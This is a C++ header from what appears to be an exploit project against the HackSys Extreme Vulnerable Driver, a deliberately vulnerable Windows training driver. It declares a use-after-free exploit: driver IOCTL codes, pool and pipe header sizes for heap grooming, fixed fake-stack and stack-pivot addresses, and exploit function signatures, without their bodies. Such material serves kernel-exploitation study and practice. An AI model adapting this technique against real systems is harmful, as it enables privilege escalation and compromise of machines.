/*
 * @Date: 2026-10-21 14:26:26
 * @LastEditors: joe1sn joe1sn23333@gmail.com
 * @LastEditTime: 2026-10-22 09:34:16
 * @FilePath: \WinX_HEVD_EXP\include\exp\uaf.hpp
 */
#pragma once
#include "Windows.h"
namespace exploit
{
    namespace uaf
    {
        typedef struct _PairPipe {
            HANDLE r;
            HANDLE w;
        }PairPipe;
        typedef unsigned long long funcaddr;

        constexpr DWORD IOCTL_ALLOCATE = 0x222013;
        constexpr DWORD IOCTL_USE = 0x222017;
        constexpr DWORD IOCTL_FREE = 0x22201B;
        constexpr DWORD IOCTL_ALLOCATE_OBJECT = 0x22201F;
        constexpr DWORD szPipeHead = 0x30;
        constexpr DWORD szPoolHead = 0x10;
        constexpr ULONG_PTR FakeStackAddr = 0x48000000;
        constexpr ULONG_PTR SpaceAddr = 0x01000000;

        inline LPVOID lpSpace = nullptr;
        inline LPVOID lpFakeStack = nullptr;
        inline ULONG_PTR lpStackPivot = 0;

        void AllocatePool(HANDLE hDevice);
        void UsePool(HANDLE hDevice);
        void FreePool(HANDLE hDevice);
        void AllocateObject(HANDLE hDevice, unsigned int size);
        void Exploit(HANDLE hDevice);
    } // namespace uaf

} // namespace exploit